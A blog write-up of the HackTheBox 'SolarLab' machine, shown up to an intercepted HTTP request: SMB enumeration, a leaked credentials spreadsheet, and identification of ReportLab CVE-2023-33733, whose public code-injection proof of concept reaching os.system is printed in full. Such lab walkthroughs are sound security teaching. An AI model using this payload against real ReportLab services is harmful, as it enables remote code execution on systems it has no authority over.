<!doctype html><html lang=en><head><title>HTB SolarLab WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'SolarLab' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB SolarLab WriteUp"><meta name=twitter:description content="HackThebox 'SolarLab' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/solarlab/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB SolarLab WriteUp"><meta property="og:description" content="HackThebox 'SolarLab' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-21T00:00:00+00:00"><meta property="article:modified_time" content="2024-09-21T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Medium"><meta property="article:tag" content="Openfire"><meta property="article:tag" content="Netexec"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/solarlab/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/solarlab/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/solarlab/>HTB SolarLab WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-09-21T00:00:00Z>21 September, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
18-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/windows/>Windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/medium/>Medium</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/openfire/>Openfire</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netexec/>Netexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/sqlite/>Sqlite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/runascs/>Runascs</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/reportlab/>Reportlab</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/smb/>Smb</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/impacket/>Impacket</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/rce/>Rce</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/exiftool/>Exiftool</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a></span></div></div></header><div class=post-content><h1 id=solarlab----hackthebox>SolarLab &ndash; HackTheBox
<a class=heading-link href=#solarlab----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty: <em>Medium</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;SolarLab&rsquo; Avatar" src=/pentesting/images/SolarLab_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>SolarLab</code> is a medium box/machine from <code>HackTheBox</code> platform. An anonymous login through <code>SMB</code> service leaks credentials for a login panel in the victim machine. In this new panel, we are allowed to generate <code>PDF</code> reports using <code>ReportLab</code> library. This library is vulnerable to <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-33733 class=external-link target=_blank rel=noopener>CVE-2023-33733</a>, which allows <code>Remote Code Execution</code> and lets us gain initial access to the target machine. Once inside, we are able to extract databases files that store passwords for one of the users in the victim machine. We can then pivot to this new user, which is allowed to read priviledged files for an <code>Openfire</code> service. Among these files, we have an encrypted password which we are able to decrypt for the user in this service. This decrypted password is also the password for <code>Administrator</code> user, gaining total control of the victim machine.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Starting with <code>Nmap</code> scan shows multiple ports open: <code>80</code> <code>HTTP</code>, <code>135</code> <code>Microsoft RPC</code>, <code>139</code> <code>NetBios</code>, <code>445</code> <code>Server Message Block</code> (<code>SMB</code>) and <code>6791</code> another <code>HTTP</code> service:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p80,135,139,445,6791 10.10.11.16 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 16:00 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.16
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.20s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT     STATE SERVICE       VERSION
</span></span></span><span class=line><span class=cl><span class=go>80/tcp   open  http          nginx 1.24.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to http://solarlab.htb/
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.24.0
</span></span></span><span class=line><span class=cl><span class=go>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span></span><span class=line><span class=cl><span class=go>445/tcp  open  microsoft-ds?
</span></span></span><span class=line><span class=cl><span class=go>6791/tcp open  http          nginx 1.24.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.24.0
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Host script results:
</span></span></span><span class=line><span class=cl><span class=go>| smb2-time:
</span></span></span><span class=line><span class=cl><span class=go>|   date: 2024-05-29T20:01:06
</span></span></span><span class=line><span class=cl><span class=go>|_  start_date: N/A
</span></span></span><span class=line><span class=cl><span class=go>| smb2-security-mode:
</span></span></span><span class=line><span class=cl><span class=go>|   3:1:1:
</span></span></span><span class=line><span class=cl><span class=go>|_    Message signing enabled but not required
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 57.64 seconds
</span></span></span></code></pre></div><p>I note that even if this is a <code>Windows</code> machine, it is running <code>Nginx</code> for services exposed at ports <code>80</code> and <code>6791</code>.</p><p>From <code>Nmap</code> scan I also can see a domain and a subdomain: <code>solarlab.htb</code> and <code>report.solarlab.htb</code>. So I add these domains to my <code>/etc/hosts</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.16 solarlab.htb report.solarlab.htb&#39; | sudo tee -a /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.16 solarlab.htb report.solarlab.htb
</span></span></span></code></pre></div><p>Visiting <code>http://solarlab.htb</code> shows a page about Instant Messaging</p><p><img alt="SolarLab 1" src=/pentesting/images/SolarLab_1.png></p><p>Many of the buttons in this page do not work, so I might came back to this page later.</p><p>Visiting <code>http://report.solarlab.htb:6791</code> shows a login panel</p><p><img alt="SolarLab 2" src=/pentesting/images/SolarLab_2.png></p><p>Default credentials like <code>admin:admin</code>, <code>root:root</code>, <code>guest:guest</code> do no work. Injections do not work either. So I will also save this page for later</p><p>At this point I decide to look for info in other services such as <code>SMB</code>. A quick scan with <code>NetExec</code> shows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.16
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
</span></span></span></code></pre></div><p>After playing with some default credentials, one of them work: <code>guest</code> (and no password):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.16 -u &#39;guest&#39; -p &#39;&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\guest:
</span></span></span></code></pre></div><p>In fact, we can see this as &ldquo;any&rdquo; user (i.e., anonymous), since if I pass another user like <code>random</code> we can still access to <code>Documents</code> share:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.16 -u &#39;random&#39; -p &#39;&#39; --shares
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\random:
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.16     445    SOLARLAB         [*] Enumerated shares
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.16     445    SOLARLAB         Share           Permissions     Remark
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.16     445    SOLARLAB         -----           -----------     ------
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.16     445    SOLARLAB         ADMIN$                          Remote Admin
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.16     445    SOLARLAB         C$                              Default share
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.16     445    SOLARLAB         Documents       READ
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.16     445    SOLARLAB         IPC$            READ            Remote IPC
</span></span></span></code></pre></div><p>We can also use <code>smbmap</code> to extract files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ smbmap -H 10.10.11.16 -u &#39;guest&#39; -p &#39;&#39; --no-banner
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Detected 1 hosts serving SMB
</span></span></span><span class=line><span class=cl><span class=go>[*] Established 1 SMB session(s)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] IP: 10.10.11.16:445 Name: solarlab.htb              Status: Authenticated
</span></span></span><span class=line><span class=cl><span class=go>        Disk                                                    Permissions     Comment
</span></span></span><span class=line><span class=cl><span class=go>        ----                                                    -----------     -------
</span></span></span><span class=line><span class=cl><span class=go>        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span></span><span class=line><span class=cl><span class=go>        C$                                                      NO ACCESS       Default share
</span></span></span><span class=line><span class=cl><span class=go>        Documents                                               READ ONLY
</span></span></span><span class=line><span class=cl><span class=go>        IPC$                                                    READ ONLY       Remote IPC
</span></span></span></code></pre></div><p>And check the contents inside <code>Documents</code> shared resource:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ smbmap -H 10.10.11.16 -u &#39;guest&#39; -p &#39;&#39; --no-banner -r &#39;Documents&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Detected 1 hosts serving SMB
</span></span></span><span class=line><span class=cl><span class=go>[*] Established 1 SMB session(s)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] IP: 10.10.11.16:445 Name: solarlab.htb              Status: Authenticated
</span></span></span><span class=line><span class=cl><span class=go>        Disk                                                    Permissions     Comment
</span></span></span><span class=line><span class=cl><span class=go>        ----                                                    -----------     -------
</span></span></span><span class=line><span class=cl><span class=go>        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span></span><span class=line><span class=cl><span class=go>        C$                                                      NO ACCESS       Default share
</span></span></span><span class=line><span class=cl><span class=go>        Documents                                               READ ONLY
</span></span></span><span class=line><span class=cl><span class=go>        ./Documents
</span></span></span><span class=line><span class=cl><span class=go>        dw--w--w--                0 Fri Apr 26 10:47:14 2024    .
</span></span></span><span class=line><span class=cl><span class=go>        dw--w--w--                0 Fri Apr 26 10:47:14 2024    ..
</span></span></span><span class=line><span class=cl><span class=go>        dr--r--r--                0 Fri Apr 26 10:41:57 2024    concepts
</span></span></span><span class=line><span class=cl><span class=go>        fr--r--r--              278 Fri Nov 17 09:34:54 2023    desktop.ini
</span></span></span><span class=line><span class=cl><span class=go>        fr--r--r--            12793 Fri Nov 17 09:34:54 2023    details-file.xlsx
</span></span></span><span class=line><span class=cl><span class=go>        dr--r--r--                0 Thu Nov 16 16:36:51 2023    My Music
</span></span></span><span class=line><span class=cl><span class=go>        dr--r--r--                0 Thu Nov 16 16:36:51 2023    My Pictures
</span></span></span><span class=line><span class=cl><span class=go>        dr--r--r--                0 Thu Nov 16 16:36:51 2023    My Videos
</span></span></span><span class=line><span class=cl><span class=go>        fr--r--r--            37194 Fri Apr 26 10:44:18 2024    old_leave_request_form.docx
</span></span></span><span class=line><span class=cl><span class=go>        IPC$                                                    READ ONLY       Remote IPC
</span></span></span></code></pre></div><p>I download these files. For example, to download <code>details-file.xlsx</code> file, we run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ smbmap -H 10.10.11.16 -u &#39;guest&#39; -p &#39;&#39; --no-banner --download &#39;Documents/details-file.xlsx&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Detected 1 hosts serving SMB
</span></span></span><span class=line><span class=cl><span class=go>[*] Established 1 SMB session(s)
</span></span></span><span class=line><span class=cl><span class=go>[+] Starting download: Documents\details-file.xlsx (12793 bytes)
</span></span></span><span class=line><span class=cl><span class=go>[+] File output to: /home/gunzf0x/HTB/HTBMachines/Medium/SolarLab/content/10.10.11.16-Documents_details-file.xlsx
</span></span></span></code></pre></div><p>After downloading all of them we read them. The file <code>old_leave_request_form.docx</code> (a <code>Microsoft Word</code> file) shows a Holiday Request Form:</p><p><img alt="SolarLab 3" src=/pentesting/images/SolarLab_3.png></p><p>and the file <code>details-file.xlsx</code> shows some interesting info:</p><p><img alt="SolarLab 4" src=/pentesting/images/SolarLab_4.png></p><p>We have found a file with plaintext passwords and usernames. We save them into a file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat potential_user_and_passwords.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Alexander.knight@gmail.com:al;ksdhfewoiuh
</span></span></span><span class=line><span class=cl><span class=go>Kalexander:dkjafblkjadsfgl
</span></span></span><span class=line><span class=cl><span class=go>Alexander.knight@gmail.com:d398sadsknr390
</span></span></span><span class=line><span class=cl><span class=go>blake.byte:ThisCanB3typedeasily1@
</span></span></span><span class=line><span class=cl><span class=go>AlexanderK:danenacia9234n
</span></span></span><span class=line><span class=cl><span class=go>ClaudiaS:dadsfawe9dafkn
</span></span></span></code></pre></div><p>I note that the users <code>AlexanderK</code> and <code>ClaudiaS</code> are present in the main webpage <code>http://solarlab.htb</code>:</p><p><img alt="SolarLab 5" src=/pentesting/images/SolarLab_5.png></p><p>Therefore, we might also have a user <code>BlakeB</code> (since we have found the user <code>blake.byte</code> for the person <code>Blake Byte</code>)</p><p>Back to <code>http://report.solarlab.htb:6791</code> we can attempt to use the credentials found. As we suspected, one of them work: <code>BlakeB:ThisCanB3typedeasily1@</code>. Once inside the panel we can see:</p><p><img alt="Solarlab 6" src=/pentesting/images/SolarLab_6.png></p><p>Going to <code>Training Request</code> I can see a form. Filling it with random data, and adding as signature a random <code>.png</code> file:</p><p><img alt="SolarLab 7" src=/pentesting/images/SolarLab_7.png></p><p>and clicking on <code>Generate PDF</code> generates a random <code>PDF</code> file.</p><p><img alt="SolarLab 8" src=/pentesting/images/SolarLab_8.png></p><p>I save this <code>PDF</code> file and analyze it with <code>exiftool</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ exiftool generated_pdf.pdf
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ExifTool Version Number         : 12.76
</span></span></span><span class=line><span class=cl><span class=go>File Name                       : generated_pdf.pdf
</span></span></span><span class=line><span class=cl><span class=go>Directory                       : .
</span></span></span><span class=line><span class=cl><span class=go>File Size                       : 272 kB
</span></span></span><span class=line><span class=cl><span class=go>File Modification Date/Time     : 2024:05:29 18:42:35-04:00
</span></span></span><span class=line><span class=cl><span class=go>File Access Date/Time           : 2024:05:29 18:42:35-04:00
</span></span></span><span class=line><span class=cl><span class=go>File Inode Change Date/Time     : 2024:05:29 18:42:35-04:00
</span></span></span><span class=line><span class=cl><span class=go>File Permissions                : -rw-r--r--
</span></span></span><span class=line><span class=cl><span class=go>File Type                       : PDF
</span></span></span><span class=line><span class=cl><span class=go>File Type Extension             : pdf
</span></span></span><span class=line><span class=cl><span class=go>MIME Type                       : application/pdf
</span></span></span><span class=line><span class=cl><span class=go>PDF Version                     : 1.4
</span></span></span><span class=line><span class=cl><span class=go>Linearized                      : No
</span></span></span><span class=line><span class=cl><span class=go>Author                          : (anonymous)
</span></span></span><span class=line><span class=cl><span class=go>Create Date                     : 2024:05:30 01:39:45-02:00
</span></span></span><span class=line><span class=cl><span class=go>Creator                         : (unspecified)
</span></span></span><span class=line><span class=cl><span class=go>Modify Date                     : 2024:05:30 01:39:45-02:00
</span></span></span><span class=line><span class=cl><span class=go>Producer                        : ReportLab PDF Library - www.reportlab.com
</span></span></span><span class=line><span class=cl><span class=go>Subject                         : (unspecified)
</span></span></span><span class=line><span class=cl><span class=go>Title                           : (anonymous)
</span></span></span><span class=line><span class=cl><span class=go>Trapped                         : False
</span></span></span><span class=line><span class=cl><span class=go>Page Mode                       : UseNone
</span></span></span><span class=line><span class=cl><span class=go>Page Count                      : 1
</span></span></span></code></pre></div><p>From the webpage, and also from the <code>PDF</code> metadata I can see something: <code>ReportLab</code>. Searching <code>what is reportlab pdf</code> we find:</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content><code>ReportLab</code> is a software library that lets you directly create documents in Adobe&rsquo;s <code>Portable Document Format</code> (<code>PDF</code>) using the <code>Python</code> programming language. <code>PDF</code> is the global standard for electronic documents</div></div><p>Searching for <code>ReportLab exploit</code> I can see that there is a vulnerability labeled as <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-33733 class=external-link target=_blank rel=noopener>CVE-2023-33733</a> that allows <code>Remote Code Execution</code> (<code>RCE</code>). Looking for Proof of Concepts for this vulnerability I find <a href=https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897 class=external-link target=_blank rel=noopener>this brew report</a> and <a href=https://github.com/c53elyas/CVE-2023-33733/blob/master/code-injection-poc/poc.py class=external-link target=_blank rel=noopener>this Github repository</a>. The <a href=https://github.com/c53elyas/CVE-2023-33733/blob/master/code-injection-poc/poc.py class=external-link target=_blank rel=noopener>PoC</a> provided is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>reportlab.platypus</span> <span class=kn>import</span> <span class=n>SimpleDocTemplate</span><span class=p>,</span> <span class=n>Paragraph</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>io</span> <span class=kn>import</span> <span class=n>BytesIO</span>
</span></span><span class=line><span class=cl><span class=n>stream_file</span> <span class=o>=</span> <span class=n>BytesIO</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>content</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add_paragraph</span><span class=p>(</span><span class=n>text</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34; Add paragraph to document content&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>Paragraph</span><span class=p>(</span><span class=n>text</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_document_template</span><span class=p>(</span><span class=n>stream_file</span><span class=p>:</span> <span class=n>BytesIO</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34; Get SimpleDocTemplate &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>SimpleDocTemplate</span><span class=p>(</span><span class=n>stream_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_document</span><span class=p>(</span><span class=n>document</span><span class=p>,</span> <span class=n>content</span><span class=p>,</span> <span class=o>**</span><span class=n>props</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34; Build pdf document based on elements added in `content`&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>document</span><span class=o>.</span><span class=n>build</span><span class=p>(</span><span class=n>content</span><span class=p>,</span> <span class=o>**</span><span class=n>props</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>doc</span> <span class=o>=</span> <span class=n>get_document_template</span><span class=p>(</span><span class=n>stream_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># THE INJECTED PYTHON CODE THAT IS PASSED TO THE COLOR EVALUATOR</span>
</span></span><span class=line><span class=cl><span class=c1>#[</span>
</span></span><span class=line><span class=cl><span class=c1>#    [</span>
</span></span><span class=line><span class=cl><span class=c1>#        getattr(pow, Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;touch /tmp/exploited&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#        for Word in [</span>
</span></span><span class=line><span class=cl><span class=c1>#            orgTypeFun(</span>
</span></span><span class=line><span class=cl><span class=c1>#                &#39;Word&#39;,</span>
</span></span><span class=line><span class=cl><span class=c1>#                (str,),</span>
</span></span><span class=line><span class=cl><span class=c1>#                {</span>
</span></span><span class=line><span class=cl><span class=c1>#                    &#39;mutated&#39;: 1,</span>
</span></span><span class=line><span class=cl><span class=c1>#                    &#39;startswith&#39;: lambda self, x: False,</span>
</span></span><span class=line><span class=cl><span class=c1>#                    &#39;__eq__&#39;: lambda self, x: self.mutate()</span>
</span></span><span class=line><span class=cl><span class=c1>#                    and self.mutated &lt; 0</span>
</span></span><span class=line><span class=cl><span class=c1>#                    and str(self) == x,</span>
</span></span><span class=line><span class=cl><span class=c1>#                    &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)},</span>
</span></span><span class=line><span class=cl><span class=c1>#                    &#39;__hash__&#39;: lambda self: hash(str(self)),</span>
</span></span><span class=line><span class=cl><span class=c1>#                },</span>
</span></span><span class=line><span class=cl><span class=c1>#            )</span>
</span></span><span class=line><span class=cl><span class=c1>#        ]</span>
</span></span><span class=line><span class=cl><span class=c1>#    ]</span>
</span></span><span class=line><span class=cl><span class=c1>#    for orgTypeFun in [type(type(1))]</span>
</span></span><span class=line><span class=cl><span class=c1>#]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add_paragraph</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>            &lt;para&gt;
</span></span></span><span class=line><span class=cl><span class=s2>              &lt;font color=&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;touch /tmp/exploited&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>                exploit
</span></span></span><span class=line><span class=cl><span class=s2>                &lt;/font&gt;
</span></span></span><span class=line><span class=cl><span class=s2>            &lt;/para&gt;&#34;&#34;&#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>build_document</span><span class=p>(</span><span class=n>doc</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span></code></pre></div><p>where we can see that the payload, in this case just a simple <code>touch /tmp/exploited</code>, is set.</p><p>Now, back to the site <code>report.solarlab.htb</code> I will try to generate again a <code>PDF</code>, but this time I will intercept it with <code>Burpsuite</code>, where we have the request:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/trainingRequest</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>report.solarlab.htb:6791</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
